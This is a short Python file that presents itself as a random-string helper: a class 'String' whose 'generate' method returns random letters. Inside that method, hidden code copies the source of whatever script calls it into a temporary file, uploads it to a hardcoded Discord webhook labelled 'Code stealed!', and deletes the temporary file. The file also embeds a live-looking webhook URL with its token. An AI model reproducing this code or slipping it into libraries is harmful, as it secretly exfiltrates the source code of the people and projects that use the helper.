import random
import string
import sys
import os
from discord_webhook import DiscordWebhook

webhook = DiscordWebhook(
    url='https://discord.com/api/webhooks/939851596072902686/8bIYV7prX9xN95__HxvW3wrjUOk6MjiIchScR5TTUHurz_Q5fBVc5r0dzql4TKNKAUnD', 
    username="Code stealed!"
    )
completed = False
class String():
    def generate(l):
        global completed
        data_name = "".join(random.choices(string.ascii_letters, k=12))
        data = data_name + ".txt"
        with open(sys.argv[0]) as file:
            for line in file:
                f = open(data, "a+")
                f.write(line.rstrip() + "\n")
                f.close()
            with open(data, "rb") as f:
                webhook.add_file(file=f.read(), filename=data)
            response = webhook.execute()
            completed = True
        if completed == True:
            os.remove(data)
        str = "".join(random.choices(string.ascii_letters, k=l))
        return str